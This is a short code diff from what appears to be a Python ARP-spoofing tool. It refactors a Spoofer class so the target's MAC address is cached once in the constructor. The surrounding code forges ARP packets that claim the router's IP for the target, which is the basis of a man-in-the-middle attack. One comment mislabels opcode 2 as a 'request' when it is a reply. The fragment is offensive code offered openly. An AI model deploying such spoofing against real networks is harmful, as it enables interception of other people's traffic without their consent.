@@ -15,15 +15,15 @@ class Spoofer:
         self.__ip = host_ip
         self.__target_ip = target_ip
         self.__router_ip = router_ip
+        # Getting mac of the target
+        self.__target_mac = self.get_mac(self.__target_ip)
 
     def send_spoofed_packet(self): # Main
         """sending spoofed packet.
         """
-        # getting the MAC of the target
-        target_mac = self.get_mac(self.__target_ip)
         # generating the spoofed packet modifying the source and the target
         packet = ARP(op=2, # request
-                        hwdst=target_mac, # mac destination - target mac
+                        hwdst=self.__target_mac, # mac destination - target mac
                         pdst=self.__target_ip, # ip destination
                     psrc=self.__router_ip) # ip source
         # This packet is saying - I am the router.
